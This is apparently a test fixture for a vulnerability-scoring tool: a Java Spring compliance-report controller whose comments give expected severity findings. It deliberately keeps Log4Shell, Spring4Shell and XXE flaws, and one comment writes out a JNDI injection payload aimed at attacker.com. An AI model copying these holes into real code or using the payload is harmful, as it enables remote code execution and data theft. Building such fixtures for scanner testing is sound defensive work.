package com.apex.compliance.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;
import com.apex.compliance.service.ReportService;

import javax.xml.parsers.DocumentBuilderFactory;
import java.io.ByteArrayInputStream;

/**
 * Compliance reporting controller.
 * NOTE: This service is NOT exposed via K8s Ingress — it is internal only.
 * Despite having vulnerabilities, its pc_exposure = internal (NOT internet_facing).
 * D6 will score 0.3 (not 1.0), and D1 will be internal hops (not 0-1 hops).
 *
 * CVE-2021-44228 (Log4Shell) via log4j-core 2.14.1
 * CVE-2022-22965 (Spring4Shell) via Spring Framework 5.3.15
 *
 * FINDINGS:
 *   F-004 — CVE-2021-44228 on generateReport:
 *     Expected: HIGH (KEV + EPSS=0.975 but internal = D6=0.3)
 *   F-007 — CVE-2022-22965 on generateReport:
 *     Expected: HIGH (KEV + EPSS=0.974 but internal = D6=0.3)
 *   F-008 — CWE-611 XXE on parseXmlReport:
 *     Expected: MEDIUM (internal, no active exploit CVE, partial exposure)
 */
@RestController
@RequestMapping("/internal/v1/compliance")
public class ReportController {

    // CVE-2021-44228 target: log4j-core 2.14.1 — JNDI injection via logger.info()
    private static final Logger logger = LogManager.getLogger(ReportController.class);

    private final ReportService reportService;

    public ReportController(ReportService reportService) {
        this.reportService = reportService;
    }

    /**
     * GET /internal/v1/compliance/report?period=2026-Q1&format=pdf
     * is_entry_point=true (Spring @GetMapping)
     * firewall_posture=declared_restrictive (internal service, requires service token)
     * sensitivity_class=financial (regulatory compliance data)
     *
     * CVE-2021-44228 VECTOR: logger.info() with user-supplied period parameter.
     * If period = "${jndi:ldap://attacker.com/exploit}", Log4Shell triggers.
     * LAZARUS-GROUP actively exploits CVE-2021-44228.
     *
     * FINDING F-004 (CVE-2021-44228):
     *   D3: EPSS=0.975, KEV=true → 1.0
     *   D6: INTERNAL (not in Ingress) → 0.3
     *   D7: LAZARUS active → high multiplier
     *   Expected: HIGH (not CRITICAL because internal = D6=0.3)
     *
     * FINDING F-007 (CVE-2022-22965, Spring4Shell):
     *   D3: EPSS=0.974, KEV=true → 1.0
     *   D6: INTERNAL → 0.3
     *   Expected: HIGH
     */
    @GetMapping("/report")
    public ResponseEntity<?> generateReport(
            @RequestParam String period,
            @RequestParam(defaultValue = "json") String format,
            @RequestHeader(value = "X-Service-Token", required = false) String token) {

        if (token == null || token.isEmpty()) {
            return ResponseEntity.status(403).body("missing service token");
        }

        // CVE-2021-44228 TRIGGER: user-supplied `period` logged via log4j 2.14.1
        logger.info("Generating compliance report for period: {}", period);  // Log4Shell

        // CVE-2022-22965 TRIGGER: Spring DataBinder + class property access
        var report = reportService.processReportData(period, format);
        return ResponseEntity.ok(report);
    }

    /**
     * POST /internal/v1/compliance/report/xml
     * Parses an XML compliance report from an external system.
     * is_entry_point=true (Spring @PostMapping)
     * firewall_posture=declared_restrictive (internal only, service token)
     *
     * XXE VULNERABILITY: DocumentBuilderFactory not hardened.
     * External entity injection possible if xmlContent comes from untrusted source.
     *
     * FINDING F-008 (CWE-611 XXE):
     *   D6: INTERNAL → 0.3
     *   D3: No active CVE, confidence-based → 0.5
     *   Expected: MEDIUM (real vulnerability, reduced by internal exposure)
     */
    @PostMapping("/report/xml")
    public ResponseEntity<?> parseXmlReport(
            @RequestBody String xmlContent,
            @RequestHeader(value = "X-Service-Token", required = false) String token) {

        if (token == null) return ResponseEntity.status(403).body("unauthorized");

        try {
            // XXE VULNERABLE: external entity expansion not disabled
            var factory = DocumentBuilderFactory.newInstance();
            // Missing: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)
            var builder = factory.newDocumentBuilder();
            var doc     = builder.parse(new ByteArrayInputStream(xmlContent.getBytes()));
            return ResponseEntity.ok(Map.of("parsed", true, "root", doc.getDocumentElement().getTagName()));
        } catch (Exception e) {
            logger.error("XML parse error", e);
            return ResponseEntity.badRequest().body("invalid xml");
        }
    }
}
